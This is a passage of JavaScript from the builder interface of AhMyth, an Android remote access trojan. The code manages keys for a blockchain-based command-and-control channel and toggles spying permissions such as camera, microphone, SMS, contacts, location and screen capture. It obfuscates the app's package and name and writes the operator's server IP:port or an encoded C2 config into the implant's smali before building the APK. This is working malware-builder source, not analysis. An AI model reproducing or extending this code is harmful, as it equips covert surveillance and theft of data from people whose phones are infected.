        $scope.$applyAsync();
        $appCtrl.Log('[✓] Generated new AES-256 key', CONSTANTS.logStatus.SUCCESS);
    };
    
    $appCtrl.generateClientKey = () => {
        if (!crypto || !bs58 || !Keypair) {
            $appCtrl.Log('[✗] Cannot generate client key: Missing crypto, bs58, or Keypair library', CONSTANTS.logStatus.FAIL);
            return;
        }
            const kp = Keypair.generate();
            $appCtrl.builder.blockchainClientPrivateKey = bs58.encode(kp.secretKey);
        updateBlockchainAddresses();
        $scope.$applyAsync();
        $appCtrl.Log('[✓] Generated new client private key (fund before use)', CONSTANTS.logStatus.SUCCESS);
    };
    
    $appCtrl.generateOperatorKey = () => {
        if (!crypto || !bs58 || !Keypair) {
            $appCtrl.Log('[✗] Cannot generate operator key: Missing crypto, bs58, or Keypair library', CONSTANTS.logStatus.FAIL);
            return;
        }
            const kp = Keypair.generate();
            $appCtrl.builder.blockchainOperatorPrivateKey = bs58.encode(kp.secretKey);
        updateBlockchainAddresses();
        $scope.$applyAsync();
        $appCtrl.Log('[✓] Generated new operator private key', CONSTANTS.logStatus.SUCCESS);
    };
    
    $appCtrl.loadBlockchainKeys = () => {
        try {
            const env = parseEnvFile(blockchainKeysEnvPath);
            if (env.SOLANA_RPC_URL || env.BLOCKCHAIN_RPC_URL) {
                $appCtrl.builder.blockchainRpcUrl = env.SOLANA_RPC_URL || env.BLOCKCHAIN_RPC_URL;
            }
            if (env.BLOCKCHAIN_C2_AES_KEY) $appCtrl.builder.blockchainC2AesKey = env.BLOCKCHAIN_C2_AES_KEY;
            if (env.BLOCKCHAIN_PRIVATE_KEY) $appCtrl.builder.blockchainOperatorPrivateKey = env.BLOCKCHAIN_PRIVATE_KEY;
            if (env.BLOCKCHAIN_CLIENT_PRIVATE_KEY) $appCtrl.builder.blockchainClientPrivateKey = env.BLOCKCHAIN_CLIENT_PRIVATE_KEY;
            if (env.BLOCKCHAIN_RPC_FALLBACKS) $appCtrl.builder.blockchainRpcFallbacks = env.BLOCKCHAIN_RPC_FALLBACKS;
            const contractEnv = parseEnvFile(blockchainContractEnvPath);
            if (contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS) {
                $appCtrl.blockchainC2Contract = contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS;
                $appCtrl.blockchainContract = contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS;
            } else if (contractEnv.CONTRACT_ADDRESS) {
                // Legacy support for CONTRACT_ADDRESS
                $appCtrl.blockchainC2Contract = contractEnv.CONTRACT_ADDRESS;
                $appCtrl.blockchainContract = contractEnv.CONTRACT_ADDRESS;
            }
            const detectedChain = detectChainFromKey($appCtrl.builder.blockchainOperatorPrivateKey) || detectChainFromKey($appCtrl.builder.blockchainClientPrivateKey);
            if (detectedChain) {
                $appCtrl.blockchainChain = detectedChain;
            }
            updateBlockchainAddresses();
            if ($appCtrl.builder.blockchainOperatorAddress || $appCtrl.builder.blockchainClientAddress || $appCtrl.blockchainContract) {
                $appCtrl.refreshBlockchainBalances();
            } else {
                $appCtrl.Log('[ℹ] Blockchain addresses not set; balances will remain N/A until keys/contract are provided.', CONSTANTS.logStatus.INFO);
            }
            if ($scope && $scope.$applyAsync) {
                $scope.$applyAsync();
            }
            if ($appCtrl.Log) {
                $appCtrl.Log(`[✓] Loaded blockchain keys and contract from ${blockchainKeysEnvPath} and ${blockchainContractEnvPath}`, CONSTANTS.logStatus.SUCCESS);
            } else {
                console.log(`[✓] Loaded blockchain keys and contract from ${blockchainKeysEnvPath} and ${blockchainContractEnvPath}`);
            }
        } catch (e) {
            if ($appCtrl.Log) {
                $appCtrl.Log(`[✗] Failed to load blockchain keys: ${e.message}. Attempted to read from ${blockchainKeysEnvPath} and ${blockchainContractEnvPath}`, CONSTANTS.logStatus.FAIL);
            } else {
                console.error(`Failed to load blockchain keys: ${e.message}`);
            }
        }
    };
    
    $appCtrl.saveBlockchainKeys = () => {
        try {
            const lines = [];
            if ($appCtrl.builder.blockchainOperatorPrivateKey) lines.push(`BLOCKCHAIN_PRIVATE_KEY=${$appCtrl.builder.blockchainOperatorPrivateKey}`);
            if ($appCtrl.builder.blockchainClientPrivateKey) lines.push(`BLOCKCHAIN_CLIENT_PRIVATE_KEY=${$appCtrl.builder.blockchainClientPrivateKey}`);
            if ($appCtrl.builder.blockchainC2AesKey) lines.push(`BLOCKCHAIN_C2_AES_KEY=${$appCtrl.builder.blockchainC2AesKey}`);
            if ($appCtrl.builder.blockchainRpcUrl) {
                lines.push(`BLOCKCHAIN_RPC_URL=${$appCtrl.builder.blockchainRpcUrl}`);
                lines.push(`SOLANA_RPC_URL=${$appCtrl.builder.blockchainRpcUrl}`);
            }
            if ($appCtrl.builder.blockchainRpcFallbacks) lines.push(`BLOCKCHAIN_RPC_FALLBACKS=${$appCtrl.builder.blockchainRpcFallbacks}`);
            
            // Ensure projectRoot is defined before using it
            let keysPath = blockchainKeysEnvPath;
            if (!keysPath) {
                 const appPath = remote.app.getAppPath();
                 const projectRoot = path.resolve(appPath, '..', '..');
                 keysPath = path.join(projectRoot, '.blockchain-keys.env');
            }
            
            fs.writeFileSync(keysPath, lines.join('\n'), 'utf8');
            
            if ($appCtrl.blockchainContract) {
                let contractPath = blockchainContractEnvPath;
                if (!contractPath) {
                     const appPath = remote.app.getAppPath();
                     const projectRoot = path.resolve(appPath, '..', '..');
                     contractPath = path.join(projectRoot, '.blockchain-contract.env');
                }
                fs.writeFileSync(contractPath, `BLOCKCHAIN_CONTRACT_ADDRESS=${$appCtrl.blockchainContract}`, 'utf8');
            }
            $appCtrl.Log(`[✓] Saved blockchain keys/config to ${keysPath}`, CONSTANTS.logStatus.SUCCESS);
        } catch (e) {
            $appCtrl.Log(`[✗] Failed to save blockchain keys: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };
    
    $appCtrl.refreshBlockchainBalances = async () => {
        if (!ethers || !Connection || !PublicKey) {
            $appCtrl.Log('[✗] Cannot refresh balances: Missing ethers, Solana Connection, or PublicKey library', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        // Ensure addresses are up to date before fetching balances
        updateBlockchainAddresses();
        
        console.log('[refreshBlockchainBalances] Fetching balances for:', {
            operator: $appCtrl.builder.blockchainOperatorAddress,
            client: $appCtrl.builder.blockchainClientAddress,
            channel: $appCtrl.blockchainContract
        });
        
        try {
            $appCtrl.blockchainBalanceLoading = true;
            const { provider, chain } = await getUiRpcProvider();
            console.log('[refreshBlockchainBalances] Provider chain:', chain);
            
            if (chain === 'evm') {
                const format = (val) => `${parseFloat(ethers.formatEther(val)).toFixed(6)} ETH`;
                if ($appCtrl.builder.blockchainOperatorAddress) {
                    const bal = await provider.getBalance($appCtrl.builder.blockchainOperatorAddress);
                    $appCtrl.builder.blockchainOperatorBalance = format(bal);
                    console.log('[refreshBlockchainBalances] EVM Operator balance:', $appCtrl.builder.blockchainOperatorBalance);
                } else {
                    $appCtrl.builder.blockchainOperatorBalance = 'N/A';
                    $appCtrl.Log('[ℹ] No operator address set; skipping operator balance', CONSTANTS.logStatus.INFO);
                }
                if ($appCtrl.builder.blockchainClientAddress) {
                    const bal = await provider.getBalance($appCtrl.builder.blockchainClientAddress);
                    $appCtrl.builder.blockchainClientBalance = format(bal);
                    console.log('[refreshBlockchainBalances] EVM Client balance:', $appCtrl.builder.blockchainClientBalance);
                } else {
                    $appCtrl.builder.blockchainClientBalance = 'N/A';
                    $appCtrl.Log('[ℹ] No client address set; skipping client balance', CONSTANTS.logStatus.INFO);
                }
            } else {
                // Solana
                const formatSol = (lamports) => `${(lamports / 1_000_000_000).toFixed(6)} SOL`;
                if ($appCtrl.builder.blockchainOperatorAddress) {
                    try {
                        const bal = await provider.getBalance(new PublicKey($appCtrl.builder.blockchainOperatorAddress), 'confirmed');
                        $appCtrl.builder.blockchainOperatorBalance = formatSol(bal);
                        console.log('[refreshBlockchainBalances] Solana Operator balance:', $appCtrl.builder.blockchainOperatorBalance);
                    } catch (e) {
                        console.error('[refreshBlockchainBalances] Operator balance error:', e.message);
                        $appCtrl.builder.blockchainOperatorBalance = 'Error';
                    }
                } else {
                    $appCtrl.builder.blockchainOperatorBalance = 'N/A';
                    $appCtrl.Log('[ℹ] No operator address set; skipping operator balance', CONSTANTS.logStatus.INFO);
                }
                if ($appCtrl.builder.blockchainClientAddress) {
                    try {
                        const bal = await provider.getBalance(new PublicKey($appCtrl.builder.blockchainClientAddress), 'confirmed');
                        $appCtrl.builder.blockchainClientBalance = formatSol(bal);
                        console.log('[refreshBlockchainBalances] Solana Client balance:', $appCtrl.builder.blockchainClientBalance);
                    } catch (e) {
                        console.error('[refreshBlockchainBalances] Client balance error:', e.message);
                        $appCtrl.builder.blockchainClientBalance = 'Error';
                    }
                } else {
                    $appCtrl.builder.blockchainClientBalance = 'N/A';
                    $appCtrl.Log('[ℹ] No client address set; skipping client balance', CONSTANTS.logStatus.INFO);
                }
                if ($appCtrl.blockchainContract) {
                    try {
                        const bal = await provider.getBalance(new PublicKey($appCtrl.blockchainContract), 'confirmed');
                        $appCtrl.builder.blockchainChannelBalance = formatSol(bal);
                        console.log('[refreshBlockchainBalances] Channel balance:', $appCtrl.builder.blockchainChannelBalance);
                    } catch (e) {
                        console.error('[refreshBlockchainBalances] Channel balance error:', e.message);
                        $appCtrl.builder.blockchainChannelBalance = 'Error';
                    }
                } else {
                    $appCtrl.Log('[ℹ] No channel/contract address set; skipping channel balance', CONSTANTS.logStatus.INFO);
                }
            }
            $scope.$applyAsync();
            $appCtrl.Log('[✓] Updated blockchain balances', CONSTANTS.logStatus.SUCCESS);
        } catch (e) {
            console.error('[refreshBlockchainBalances] Error:', e);
            $appCtrl.Log(`[✗] Balance check failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
        } finally {
            $appCtrl.blockchainBalanceLoading = false;
            $scope.$applyAsync();
        }
    };
    
    $appCtrl.deployBlockchainContract = async () => {
        if (!ethers || !exec || !fs || !path) {
            $appCtrl.Log('[✗] Cannot deploy contract: Missing ethers, exec, fs, or path library', CONSTANTS.logStatus.FAIL);
            return;
        }
        if (($appCtrl.blockchainChain || 'solana') === 'solana') {
            $appCtrl.Log('[ℹ] Solana uses a pre-funded channel; set BLOCKCHAIN_CONTRACT_ADDRESS to your channel pubkey.', CONSTANTS.logStatus.INFO);
            return;
        }
        try {
            const rpcToUse = ($appCtrl.builder.blockchainRpcUrl || process.env.BLOCKCHAIN_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com').trim();
            const opKey = ($appCtrl.builder.blockchainOperatorPrivateKey || process.env.BLOCKCHAIN_PRIVATE_KEY || '').trim();
            if (!opKey) {
                $appCtrl.Log('[✗] Operator private key required to deploy contract', CONSTANTS.logStatus.FAIL);
                return;
            }
            $appCtrl.Log('[→] Deploying contract via deploy-free-contract.js...', CONSTANTS.logStatus.INFO);
            
            let deployScriptPath = path.join(projectRoot, 'deploy-free-contract.js');
            if (!fs.existsSync(deployScriptPath)) {
                deployScriptPath = path.join(projectRoot, 'deploy-contract-only.js'); // Fallback
            }

            await exec(`node ${deployScriptPath}`, {
                cwd: projectRoot,
                env: { ...process.env, BLOCKCHAIN_RPC_URL: rpcToUse, BLOCKCHAIN_PRIVATE_KEY: opKey }
            });
            const contractEnv = parseEnvFile(blockchainContractEnvPath);
            if (contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS) {
                $appCtrl.blockchainC2Contract = contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS;
                $appCtrl.blockchainContract = contractEnv.BLOCKCHAIN_CONTRACT_ADDRESS;
                $scope.$applyAsync();
                $appCtrl.Log(`[✓] Contract deployed: ${$appCtrl.blockchainC2Contract}`, CONSTANTS.logStatus.SUCCESS);
            } else {
                $appCtrl.Log('[✗] Contract deployment completed but address not found in env file', CONSTANTS.logStatus.FAIL);
            }
        } catch (e) {
            $appCtrl.Log(`[✗] Contract deploy failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };
    
    $appCtrl.runRpcSmokeTest = async () => {
        try {
            const { provider, rpcUrl, chain } = await getUiRpcProvider();
            if (chain === 'evm') {
                const block = await provider.getBlockNumber();
                $appCtrl.Log(`[✓] RPC OK (${rpcUrl}) - latest block ${block}`, CONSTANTS.logStatus.SUCCESS);
            } else {
                const { blockhash, lastValidBlockHeight } = await provider.getLatestBlockhash('confirmed');
                $appCtrl.Log(`[✓] RPC OK (${rpcUrl}) - blockhash ${blockhash.slice(0, 12)}... height ${lastValidBlockHeight}`, CONSTANTS.logStatus.SUCCESS);
            }
        } catch (e) {
            $appCtrl.Log(`[✗] RPC test failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };
    
    updateBlockchainAddresses();
    $appCtrl.loadBlockchainKeys();
    $scope.$watch('blockchainChain', () => updateBlockchainAddresses());

    // Permissions/Features selection
    $appCtrl.permissions = {
        camera: false,
        storage: false,
        microphone: false,
        location: false,
        contacts: false,
        sms: false,
        callLogs: false,
        wifi: true,
        accounts: false,
        phoneCall: false,
        screenCapture: false,
        notifications: false,
        clipboard: false,
        apps: false,
        browser: false,
        usageStats: false
    };

    // Select all permissions
    $appCtrl.selectAllPermissions = () => {
        Object.keys($appCtrl.permissions).forEach(key => {
            $appCtrl.permissions[key] = true;
        });
    };

    // Deselect all permissions
    $appCtrl.deselectAllPermissions = () => {
        Object.keys($appCtrl.permissions).forEach(key => {
            $appCtrl.permissions[key] = false;
        });
    };

    // Get count of selected permissions
    $appCtrl.getSelectedPermissionsCount = () => {
        return Object.values($appCtrl.permissions).filter(v => v === true).length;
    };

    // Format date for display
    $appCtrl.formatDate = (date) => {
        if (!date) return '';
        const d = new Date(date);
        const now = new Date();
        const diff = now - d;
        
        if (diff < 60000) return 'Just now';
        if (diff < 3600000) return Math.floor(diff / 60000) + ' min ago';
        if (diff < 86400000) return Math.floor(diff / 3600000) + ' hours ago';
        if (diff < 604800000) return Math.floor(diff / 86400000) + ' days ago';
        
        return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    };

    // Obfuscation preview
    $appCtrl.previewPackage = '';
    $appCtrl.previewAppName = '';

    // Load obfuscator
    const APKObfuscator = require('./assets/js/obfuscator.js');
    const obfuscator = new APKObfuscator();

    // Generate preview names
    $appCtrl.regeneratePreview = () => {
        $appCtrl.previewPackage = $appCtrl.obfuscationOptions.customPackage || obfuscator.generatePackageName();
        $appCtrl.previewAppName = $appCtrl.obfuscationOptions.customAppName || obfuscator.generateAppName();
        if (!$appCtrl.$$phase) {
            $appCtrl.$apply();
        }
    };

    // Helper: delayed logging to keep console/messages ordered without blocking
    function delayedLog(message, status = CONSTANTS.logStatus.INFO, delayMs = 0) {
        setTimeout(() => $appCtrl.Log(message, status), delayMs);
    }

    // Helper: persist errors to log files (used by APK builder)
    function writeErrorLog(error, fileName = 'error.log') {
        try {
            fs.ensureDirSync(logPath);
            const target = path.join(logPath, fileName);
            const content = (error && error.stack) ? error.stack : String(error || 'Unknown error');
            fs.writeFileSync(target, content, 'utf8');
        } catch (e) {
            console.error('[AhMyth] Failed to write error log:', e);
        }
    }

    // Locate IOSocket.smali inside Factory/Ahmyth (handles smali, smali_classes2, smali_classes3)
    async function findIOSocketSmali() {
        const factoryPath = path.resolve(__dirname, '..', 'Factory');
        const ahmythPath = path.join(factoryPath, 'Ahmyth');
        const candidates = [
            path.join(ahmythPath, 'smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
            path.join(ahmythPath, 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
            path.join(ahmythPath, 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali')
        ];
        for (const p of candidates) {
            if (fs.existsSync(p)) return { file: p, factoryPath, ahmythPath };
        }
        // fallback recursive search
        const search = require('glob').sync(path.join(ahmythPath, '**', 'IOSocket.smali'));
        if (search && search.length > 0) {
            return { file: search[0], factoryPath, ahmythPath };
        }
        throw new Error('IOSocket.smali not found in Factory/Ahmyth');
    }

    // Update IOSocket for TCP/IP
    async function updateIOSocketTcp(ioPath, ip, port) {
        const content = fs.readFileSync(ioPath, 'utf8');
        const pattern = /http:\/\/[^"\s]+:\d+/;
        const replacement = `http://${ip}:${port}`;
        const replaced = content.replace(pattern, replacement);
        if (replaced === content) {
            throw new Error(`Could not inject TCP/IP config into IOSocket.smali (pattern not found). Wanted ${replacement}`);
        }
        fs.writeFileSync(ioPath, replaced, 'utf8');
        console.log(`[APK Builder] Set TCP/IP endpoint to ${replacement}`);
        // Verify the write persisted
        const verify = fs.readFileSync(ioPath, 'utf8');
        if (!verify.includes(replacement)) {
            throw new Error(`TCP/IP endpoint verification failed, expected ${replacement} in IOSocket.smali`);
        }
    }

    // Update IOSocket for Blockchain (encode config into placeholder)
    async function updateIOSocketBlockchain(ioPath, config) {
        const content = fs.readFileSync(ioPath, 'utf8');
        const cfg = {
            type: 'blockchain',
            rpcUrl: config.rpcUrl,
            contractAddress: config.contract,
            aesKey: config.aesKey,
            clientPrivateKey: config.clientKey,
            chain: config.chain || 'solana'
        };
        const marker = `BLOCKCHAIN_C2_CONFIG:${Buffer.from(JSON.stringify(cfg)).toString('base64')}`;

        // Try several patterns (inline URL, urlTemplate with ?model)
        let updated = content;
        const patterns = [
            /const-string\s+v\d+,\s*"http:\/\/[^"]+\?model="/,
            /http:\/\/[^"\s]+:\d+/,
            /BLOCKCHAIN_C2_CONFIG:[A-Za-z0-9+/=]+/
        ];
        let replaced = false;
        for (const p of patterns) {
            if (p.test(updated)) {
                updated = updated.replace(p, (m) => {
                    if (m.includes('?model=')) return m.replace(/http:\/\/[^"]+/, marker);
                    return marker;
                });
                replaced = true;
                break;
            }
        }
        if (!replaced) {
            throw new Error('Could not inject blockchain config into IOSocket.smali');
        }
        fs.writeFileSync(ioPath, updated, 'utf8');
    }

    // Build APK with connection-specific config (TCP or Blockchain)
    $appCtrl.Build = async (ip, port, connectionType, rpcUrl, contract, blockStep, candidates, aesKey, clientKey, chain) => {
        // Store validated values at function scope to ensure they're used throughout
        let validatedIp = null;
        let validatedPort = null;
        
        try {
            // Log the exact values received
            console.log('[APK Builder] Build() called with parameters:');
            console.log(`  ip: "${ip}" (type: ${typeof ip})`);
            console.log(`  port: ${port} (type: ${typeof port})`);
            console.log(`  connectionType: ${connectionType}`);
            
            // Validate and sanitize inputs EARLY - ensure GUI values are always used
            const connectionMode = (connectionType || 'tcp').toLowerCase();
            
            // For TCP/IP, validate that IP and port are provided and valid
            // NO DEFAULTS - must use exact values from GUI
            if (connectionMode === 'tcp') {
                // CRITICAL: Use the EXACT values passed as parameters - these come from BuildWithCurrentValues()
                // which reads directly from $appCtrl.builder.srcIP and $appCtrl.builder.srcPort (the GUI inputs)
                validatedIp = (ip || '').toString().trim();
                validatedPort = port !== null && port !== undefined ? Number(port) : null;
                
                devLog(`[APK Builder] Validated: IP="${validatedIp}", Port=${validatedPort}`);
                
                if (!validatedIp || validatedIp.length === 0) {
                    throw new Error('Server IP is required for TCP/IP builds. Please enter an IP address in the GUI.');
                }
                
                if (validatedPort === null || validatedPort === undefined || isNaN(validatedPort)) {
                    throw new Error('Port is required for TCP/IP builds. Please enter a port number in the GUI.');
                }
                
                if (validatedPort <= 0 || validatedPort > 65535) {
                    throw new Error(`Invalid port number: ${validatedPort}. Port must be between 1 and 65535.`);
                }
                
                // Validate IP format (basic validation)
                const ipPattern = /^(\d{1,3}\.){3}\d{1,3}$/;
                if (!ipPattern.test(validatedIp)) {
                    throw new Error(`Invalid IP address format: ${validatedIp}. Please enter a valid IPv4 address.`);
                }
                
                devLog(`[APK Builder] ✓ Validated TCP/IP config: ${validatedIp}:${validatedPort}`);
                delayedLog(`[ℹ] Using TCP/IP endpoint from GUI: ${validatedIp}:${validatedPort}`, CONSTANTS.logStatus.INFO);
            }
            
            // Initialize build progress
            $appCtrl.buildInProgress = true;
            $appCtrl.buildComplete = false;
            $appCtrl.buildError = false;
            $appCtrl.buildPercent = 0;
            $appCtrl.buildStatus = 'Initializing build...';
            $appCtrl.buildSteps = [
                { label: 'Updating Factory source', active: false, complete: false, error: false },
                { label: 'Building client APK', active: false, complete: false, error: false },
                { label: 'Decompiling APK', active: false, complete: false, error: false },
                { label: 'Injecting configuration', active: false, complete: false, error: false },
                { label: 'Building final APK', active: false, complete: false, error: false },
                { label: 'Signing APK', active: false, complete: false, error: false }
            ];
            if (!$appCtrl.$$phase) $appCtrl.$apply();
            
            devLog(`[APK Builder] Starting build process (${connectionType})...`);
            delayedLog('[→] Preparing build...', CONSTANTS.logStatus.INFO);
            
            // Get factory path first
            // Locate Factory path once (we'll re-resolve IOSocket after update-source runs)
            let { file: ioPath, factoryPath } = await findIOSocketSmali();
            
            // Auto-update Factory source from latest client build
            devLog('[APK Builder] Updating Factory source...');
            delayedLog('[→] Updating Factory source from latest client build...', CONSTANTS.logStatus.INFO);
            const updateSourceScript = path.join(factoryPath, 'update-source.ps1');
            // connectionMode already defined above
            // Choose the correct client source (TCP vs Blockchain) for the build
            let clientSourceDir = connectionMode === 'blockchain'
                ? path.resolve(projectRoot, 'AhMyth-Client-Blockchain')
                : path.resolve(projectRoot, 'AhMyth-Client');
            if (!fs.existsSync(clientSourceDir)) {
                const fallbackDir = path.resolve(projectRoot, 'AhMyth-Client');
                console.warn(`[APK Builder] Client source not found at ${clientSourceDir}, falling back to ${fallbackDir}`);
                delayedLog('[⚠] Client source not found, falling back to TCP client', CONSTANTS.logStatus.WARNING);
                clientSourceDir = fallbackDir;
            }
            console.log(`[APK Builder] Using client source: ${clientSourceDir}`);
            if (fs.existsSync(updateSourceScript)) {
                try {
                    // Use PowerShell to run the script
                    devLog('[APK Builder] Building client APK...');
                    delayedLog('[→] Building client APK and updating Factory source...', CONSTANTS.logStatus.INFO);
                    delayedLog('[ℹ] This may take a few minutes...', CONSTANTS.logStatus.INFO);
                    
                    // Use spawn for real-time output streaming
                    const allOutput = [];
                    const allErrors = [];
                    let lastProgressTime = Date.now();
                    const progressInterval = 30000; // Show progress every 30 seconds
                    let progressTimer = null;
                    
                    const result = await new Promise((resolve, reject) => {
                        const psProcess = spawn('powershell', [
                            '-NoProfile',
                            '-NoLogo',
                            '-ExecutionPolicy', 'Bypass',
                            '-File', updateSourceScript,
                            '-ConnectionType', connectionMode,
                            '-ClientPath', clientSourceDir
                        ], {
                            cwd: factoryPath,
                            shell: false,
                            stdio: ['ignore', 'pipe', 'pipe']
                        });
                    
                        let stdoutBuffer = '';
                        let stderrBuffer = '';
                        
                        // Progress heartbeat - show message every 30 seconds if no output
                        progressTimer = setInterval(() => {
                            const timeSinceLastOutput = Date.now() - lastProgressTime;
                            if (timeSinceLastOutput >= progressInterval) {
                                // Progress message already logged to UI, no need for console
                                delayedLog('[ℹ] Build in progress... (this may take several minutes)', CONSTANTS.logStatus.INFO);
                            }
                        }, progressInterval);
                        
                        // Helper function to check if a line is a non-fatal PowerShell warning
                        const isNonFatalPowerShellWarning = (line) => {
                            const lower = line.toLowerCase();
                            return lower.includes('categoryinfo') ||
                                   lower.includes('fullyqualifiederrorid') ||
                                   (lower.includes('commandnotfoundexception') && 
                                    (lower.includes('import-powershelldatafile') || lower.includes('objectnotfound'))) ||
                                   lower.includes('nullarrayindex') ||
                                   (lower.includes('index operation failed') && lower.includes('null')) ||
                                   (lower.includes('cant find') && lower.includes('png')) ||
                                   (lower.includes('notspecified') && lower.includes('remoteexception'));
                        };
                        
                        // Stream stdout in real-time
                        psProcess.stdout.on('data', (data) => {
                            lastProgressTime = Date.now(); // Update last output time
                            const chunk = data.toString();
                            stdoutBuffer += chunk;
                            allOutput.push(chunk);
                            
                            // Process lines as they come
                            const lines = chunk.split('\n');
                            lines.forEach(line => {
                                const trimmed = line.trim();
                                if (trimmed && !trimmed.includes('Profile loaded')) {
                                    // Skip non-fatal PowerShell warnings
                                    if (isNonFatalPowerShellWarning(trimmed)) {
                                        // Suppress known non-fatal warnings
                                        return;
                                    }
                                    
                                    console.log(`[APK Builder] ${trimmed}`);
                                    
                                    const lowerLine = trimmed.toLowerCase();
                                    if (lowerLine.includes('error') || lowerLine.includes('failed') || lowerLine.includes('exception')) {
                                        // Double-check it's not a non-fatal warning
                                        if (!isNonFatalPowerShellWarning(trimmed)) {
                                            delayedLog(`[⚠] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.WARNING);
                                        }
                                    } else if (lowerLine.includes('success') || lowerLine.includes('done') || lowerLine.includes('updated') || lowerLine.includes('build successful') || lowerLine.includes('decompilation successful')) {
                                        delayedLog(`[✓] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.SUCCESS);
                                    } else if (lowerLine.includes('building') || lowerLine.includes('decompiling') || lowerLine.includes('[1/4]') || lowerLine.includes('[2/4]') || lowerLine.includes('[3/4]') || lowerLine.includes('[4/4]')) {
                                        delayedLog(`[ℹ] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.INFO);
                                    }
                                }
                            });
                        });
                        
                        // Stream stderr in real-time (PowerShell often outputs colored text to stderr)
                        psProcess.stderr.on('data', (data) => {
                            lastProgressTime = Date.now(); // Update last output time
                            const chunk = data.toString();
                            stderrBuffer += chunk;
                            allErrors.push(chunk);
                            
                            // Process stderr lines too (PowerShell colored output goes here)
                            const lines = chunk.split('\n');
                            lines.forEach(line => {
                                const trimmed = line.trim();
                                if (trimmed && !trimmed.includes('Profile loaded')) {
                                    // Skip non-fatal PowerShell warnings
                                    if (isNonFatalPowerShellWarning(trimmed)) {
                                        // Suppress known non-fatal warnings
                                        return;
                                    }
                                    
                                    console.log(`[APK Builder] ${trimmed}`);
                                    
                                    const lowerLine = trimmed.toLowerCase();
                                    if (lowerLine.includes('error') || lowerLine.includes('failed') || lowerLine.includes('exception')) {
                                        // Double-check it's not a non-fatal warning
                                        if (!isNonFatalPowerShellWarning(trimmed)) {
                                            delayedLog(`[⚠] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.WARNING);
                                        }
                                    } else if (lowerLine.includes('success') || lowerLine.includes('done') || lowerLine.includes('updated') || lowerLine.includes('build successful') || lowerLine.includes('decompilation successful')) {
                                        delayedLog(`[✓] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.SUCCESS);
                                    } else if (lowerLine.includes('building') || lowerLine.includes('decompiling') || lowerLine.includes('[1/4]') || lowerLine.includes('[2/4]') || lowerLine.includes('[3/4]') || lowerLine.includes('[4/4]')) {
                                        delayedLog(`[ℹ] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.INFO);
                                    }
                                }
                            });
                        });
                        
                        // Set timeout
                        const timeoutId = setTimeout(() => {
                            if (!psProcess.killed) {
                                if (progressTimer) {
                                    clearInterval(progressTimer);
                                }
                                psProcess.kill();
                                reject(new Error('Build process timed out after 10 minutes'));
                            }
                        }, 600000); // 10 minutes
                        
                        psProcess.on('close', (code) => {
                            // Clear timers
                            clearTimeout(timeoutId);
                            if (progressTimer) {
                                clearInterval(progressTimer);
                                progressTimer = null;
                            }
                            
                            const combinedOutput = stdoutBuffer + stderrBuffer;
                            const combinedOutputLower = combinedOutput.toLowerCase();
                            
                            // Check for success indicators even if exit code is non-zero
                            // (PowerShell colored output can cause false errors)
                            const hasSuccess = combinedOutputLower.includes('build successful') ||
                                             combinedOutputLower.includes('decompilation successful') ||
                                             combinedOutputLower.includes('factory source updated successfully') ||
                                             combinedOutputLower.includes('done! the electron gui builder');
                            
                            if (code === 0 || hasSuccess) {
                                resolve({
                                    stdout: stdoutBuffer,
                                    stderr: stderrBuffer,
                                    code: code
                                });
                            } else {
                                const error = new Error(`Process exited with code ${code}`);
                                error.stdout = stdoutBuffer;
                                error.stderr = stderrBuffer;
                                error.code = code;
                                reject(error);
                            }
                        });
                        
                        psProcess.on('error', (error) => {
                            // Clear timers on error
                            clearTimeout(timeoutId);
                            if (progressTimer) {
                                clearInterval(progressTimer);
                                progressTimer = null;
                            }
                            reject(error);
                        });
                    });
                    
                    devLog('[APK Builder] ✓ Factory source updated');
                    delayedLog('[✓] Factory source updated successfully', CONSTANTS.logStatus.SUCCESS);
                    
                    // Update progress
                    $appCtrl.buildSteps[0].complete = true;
                    $appCtrl.buildSteps[0].active = false;
                    $appCtrl.buildSteps[1].active = true;
                    $appCtrl.buildPercent = 20;
                    $appCtrl.buildStatus = 'Building client APK...';
                    if (!$appCtrl.$$phase) $appCtrl.$apply();
                } catch (updateErr) {
                    // Check if the error output actually contains success indicators
                    // PowerShell Write-Host with colors can output to stderr, causing false errors
                    const errorOutput = (updateErr.stdout || updateErr.stderr || '').toString();
                    const errorOutputLower = errorOutput.toLowerCase();
                    
                    // Check for success indicators in the output
                    const hasSuccess = errorOutputLower.includes('build successful') ||
                                     errorOutputLower.includes('decompilation successful') ||
                                     errorOutputLower.includes('factory source updated successfully') ||
                                     errorOutputLower.includes('done! the electron gui builder');
                    
                    if (hasSuccess) {
                        // Script actually succeeded, just had output to stderr (colored output)
                        console.log('[APK Builder] Build completed successfully (stderr output detected but script succeeded)');
                        const outputLines = errorOutput.split('\n').filter(l => l.trim() && !l.includes('Profile loaded'));
                        if (outputLines.length > 0) {
                            console.log('[APK Builder] Build output:');
                            outputLines.forEach(line => {
                                if (line.length > 0) {
                                    console.log(`  ${line}`);
                                }
                            });
                            
                            // Show success messages in GUI
                            const successLines = outputLines.filter(l => {
                                const lower = l.toLowerCase();
                                return lower.includes('success') || lower.includes('done') || lower.includes('updated');
                            });
                            successLines.slice(-3).forEach(line => {
                                delayedLog(`[✓] ${line.substring(0, 300)}`, CONSTANTS.logStatus.SUCCESS);
                            });
                        }
                        devLog('[APK Builder] ✓ Factory source updated');
